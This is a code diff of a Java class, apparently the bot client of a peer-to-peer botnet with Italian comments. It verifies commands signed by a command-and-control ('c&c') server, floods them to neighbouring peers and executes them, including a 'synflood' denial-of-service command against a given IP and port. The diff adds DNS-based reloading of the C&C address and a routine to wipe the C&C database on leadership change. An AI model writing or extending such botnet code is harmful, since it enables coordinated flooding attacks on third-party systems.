@@ -156,36 +156,43 @@ public class Behavior {
 			return;
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
-
-		// hai gia ricevuto questo msg? bella domanda
-		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
-			// System.out.println("idHashMessage " + msgs[0]);
-			System.out.println("Nuovo comando da eseguire");
-			// verifica la firma con chiave publica c&c
-			try {
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2], nServ.getCommandConquerIps().get(0).getValue2())) {
-					Pairs<Integer, String> data = new Pairs<>();
-					data.setValue1(msgHashList.getSize() + 1);
-					data.setValue2(msgs[0]);
-					msgHashList.add(data);
-					System.out.println("Signature OK");
-					// se verificato inoltralo ai vicini
-					System.out.println("Flood a vicini");
-					floodNeighoours(rawData, ip);
-					// inoltra all'interpretedei msg
-					executeCommand(msgs[1]);
-
-				} else {
-					System.out.println("Signature Comando FALLITA");
-				}
-			} catch (InvalidKeyException | SignatureException e) {
-				System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
-				e.printStackTrace();
-			}
+		if (msgs[1].startsWith("update")) {
+			reloadDns();
+			floodNeighoours(rawData, ip);
 		} else {
-			System.out.println("Comando gia eseguito");
-		}
+			// hai gia ricevuto questo msg? bella domanda
+			if (msgHashList.indexOfValue2(msgs[0]) < 0) {
+				// System.out.println("idHashMessage " + msgs[0]);
+				System.out.println("Nuovo comando da eseguire");
+				// verifica la firma con chiave publica c&c
+				try {
+					// System.out.println("signature" + msgs[2]);
+					// System.out.println(" pk " +
+					// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
+					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
+							nServ.getCommandConquerIps().get(0).getValue2())) {
+						Pairs<Integer, String> data = new Pairs<>();
+						data.setValue1(msgHashList.getSize() + 1);
+						data.setValue2(msgs[0]);
+						msgHashList.add(data);
+						System.out.println("Signature OK");
+						// se verificato inoltralo ai vicini
+						System.out.println("Flood a vicini");
+						floodNeighoours(rawData, ip);
+						// inoltra all'interpretedei msg
+						executeCommand(msgs[1]);
 
+					} else {
+						System.out.println("Signature Comando FALLITA");
+					}
+				} catch (InvalidKeyException | SignatureException e) {
+					System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
+					e.printStackTrace();
+				}
+			} else {
+				System.out.println("Comando gia eseguito");
+			}
+		}
 	}
 
 	@Async
@@ -199,17 +206,24 @@ public class Behavior {
 				System.out.println("flood vicino " + p.getValue1().getIp());
 			}
 		}
-
 	}
 
-	// TODO definire attacchi
 	@Async
 	private void executeCommand(String msg) {
 		System.out.println("Eseguendo comando " + msg);
 		if (msg.startsWith("newking")) {
-			updateCecInfo(msg);
+			if (nServ.getCounterCeCMemory() != null) {
+				if (nServ.getCounterCeCMemory() == 1) {
+					clearCecDatabase();
+					nServ.setCounterCeCMemory(null);
+				}
+				updateCecInfo(msg);
+			}
 		}
 		if (msg.startsWith("synflood")) {
+			// scompongo messaggio al fine di riempire i campi, codifica
+			// particolare <SA>
+			// TODO da fare
 			String[] msgs = msg.split("<TT>");
 			IP ipDest = new IP(msgs[1].toString());
 			Integer portDest = Integer.parseInt(msgs[2].toString());
@@ -237,7 +251,14 @@ public class Behavior {
 			if (nServ.getIdUser().equals(idUser))
 				nServ.setIdUser("");
 		}
+
 		System.out.println("COMANDO ESEGUTO");
+	}
+
+	public void reloadDns() {
+		System.out.println("Aggiorno il CeC tramite una richiesta al DNS");
+		Boolean result=nServ.firstConnectToMockServerDns();
+		System.out.println("Risultato aggiornamento dal DNS "+result);
 	}
 
 	public void updateCecInfo(String msg) {
@@ -360,6 +381,7 @@ public class Behavior {
 
 	}
 
+
 	/**
 	 * @param ip
 	 */
@@ -429,6 +451,7 @@ public class Behavior {
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
+			nServ.setCounterCeCMemory(0);
 			pServ.setNewKing("");
 		}
 		// controllare risposta da cec che ha avvisato dns
@@ -510,6 +533,13 @@ public class Behavior {
 			}
 
 		}
+	}
+
+	public void clearCecDatabase() {
+		uServ.deleteAll();
+		bServ.deleteAll();
+		rServ.deleteAll();
+
 	}
 
 	public P2PMan getpServ() {
